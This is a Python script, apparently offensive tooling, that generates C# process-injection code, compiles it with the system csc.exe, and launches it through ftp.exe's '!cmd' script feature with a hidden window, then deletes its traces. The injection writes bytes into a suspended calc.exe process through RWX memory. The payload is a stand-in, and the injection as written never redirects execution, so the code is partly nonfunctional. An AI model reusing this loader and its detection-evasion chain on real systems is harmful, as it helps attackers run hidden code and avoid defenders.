#!/usr/bin/env python3
# Ftp_csc_integration.py — Use the C# payload from Csc.py, execute via ftp.exe -s:

import os
import sys
import glob
import shutil
import base64
import subprocess
from pathlib import Path
import time

WORK_DIR = r"C:\Temp\FtpExploit"
CS_FILE = "Program.cs"
EXE_NAME = "Program.exe"
CSC_PATTERNS = [
    r"C:\Windows\Microsoft.NET\Framework\v*\csc.exe",
    r"C:\Windows\Microsoft.NET\Framework64\v*\csc.exe",
]
FTP_CANDIDATES = [
    r"C:\Windows\System32\ftp.exe",
    r"C:\Windows\Sysnative\ftp.exe",
]
FTP_SCRIPT = "ftpcommands.txt"
CALC_SRC = r"C:\Windows\System32\calc.exe"

def setup_environment(p: Path) -> None:
    p.mkdir(parents=True, exist_ok=True)

def detect_csc() -> str | None:
    hits = []
    for pat in CSC_PATTERNS:
        hits.extend(glob.glob(pat))
    if not hits:
        return None
    def verkey(path: str):
        v = os.path.basename(os.path.dirname(path)).lstrip("v")
        return tuple(int(x) for x in v.split(".") if x.isdigit())
    hits.sort(key=verkey)
    return hits[-1]

def detect_ftp() -> str | None:
    for cand in FTP_CANDIDATES:
        if os.path.exists(cand):
            return cand
    return shutil.which("ftp")

def encode_calc(work_dir: Path) -> str:
    dst = work_dir / "calc.exe"
    shutil.copy(CALC_SRC, dst)
    with open(dst, "rb") as f:
        data = f.read()
    return base64.b64encode(data).decode("ascii")

def create_cs_file(work_dir: Path, b64: str) -> Path:
    code = f"""
using System;
using System.Runtime.InteropServices;

class Program
{{
    const uint CREATE_SUSPENDED       = 0x4;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint MEM_COMMIT             = 0x1000;

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out UIntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError=true)]
    static extern uint ResumeThread(IntPtr hThread);

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    struct STARTUPINFO
    {{
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX, dwY, dwXSize, dwYSize;
        public uint dwXCountChars, dwYCountChars, dwFillAttribute, dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
    }}

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {{
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }}

    static void Main()
    {{
        string b64 = "{b64}";
        byte[] payload = Convert.FromBase64String(b64);

        STARTUPINFO si = new STARTUPINFO();
        si.cb = (uint)Marshal.SizeOf(si);
        PROCESS_INFORMATION pi;

        if (!CreateProcess(
            null,
            "C:\\\\Windows\\\\System32\\\\calc.exe",
            IntPtr.Zero,
            IntPtr.Zero,
            false,
            CREATE_SUSPENDED,
            IntPtr.Zero,
            null,
            ref si,
            out pi))
        {{
            return;
        }}

        IntPtr remoteAddr = VirtualAllocEx(
            pi.hProcess,
            IntPtr.Zero,
            (uint)payload.Length,
            MEM_COMMIT,
            PAGE_EXECUTE_READWRITE);

        UIntPtr bytesWritten;
        WriteProcessMemory(
            pi.hProcess,
            remoteAddr,
            payload,
            (uint)payload.Length,
            out bytesWritten);

        ResumeThread(pi.hThread);
    }}
}}
"""
    cs_path = work_dir / CS_FILE
    cs_path.write_text(code, encoding="utf-8")
    return cs_path

def compile_cs(csc_path: str, work_dir: Path) -> Path | None:
    res = subprocess.run(
        [csc_path, "/nologo", "/target:exe", CS_FILE],
        cwd=work_dir,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True
    )
    if res.returncode != 0:
        return None
    exe = work_dir / EXE_NAME
    return exe if exe.exists() else None

def write_ftp_script(work_dir: Path, exe_path: Path) -> Path:
    lines = [
        "prompt off",
        f'!cmd /c "{exe_path}"',
        "bye"
    ]
    script = work_dir / FTP_SCRIPT
    with open(script, "w", encoding="utf-8", newline="") as f:
        f.write("\r\n".join(lines) + "\r\n")
    return script

def run_ftp(ftp_exe: str, script_path: Path, timeout_sec: int = 15) -> None:
    subprocess.run(
        [ftp_exe, "-n", f"-s:{script_path}"],
        stdin=subprocess.DEVNULL,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        timeout=timeout_sec,
        check=False,
        creationflags=subprocess.CREATE_NO_WINDOW
    )

def cleanup(work_dir: Path) -> None:
    for name in ["calc.exe", CS_FILE, EXE_NAME, FTP_SCRIPT]:
        try:
            (work_dir / name).unlink(missing_ok=True)
        except Exception:
            pass
    try:
        time.sleep(0.5)
        work_dir.rmdir()
    except OSError:
        shutil.rmtree(work_dir, ignore_errors=True)

def main() -> int:
    work_dir = Path(WORK_DIR)
    setup_environment(work_dir)

    csc = detect_csc()
    if not csc:
        return 1

    b64 = encode_calc(work_dir)
    cs_path = create_cs_file(work_dir, b64)
    exe_path = compile_cs(csc, work_dir)
    if not exe_path:
        return 2

    ftp_exe = detect_ftp()
    if not ftp_exe:
        return 3

    script = write_ftp_script(work_dir, exe_path)
    time.sleep(0.3)
    run_ftp(ftp_exe, script, timeout_sec=15)
    time.sleep(0.3)

    cleanup(work_dir)
    return 0

if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        cleanup(Path(WORK_DIR))
        sys.exit(0)
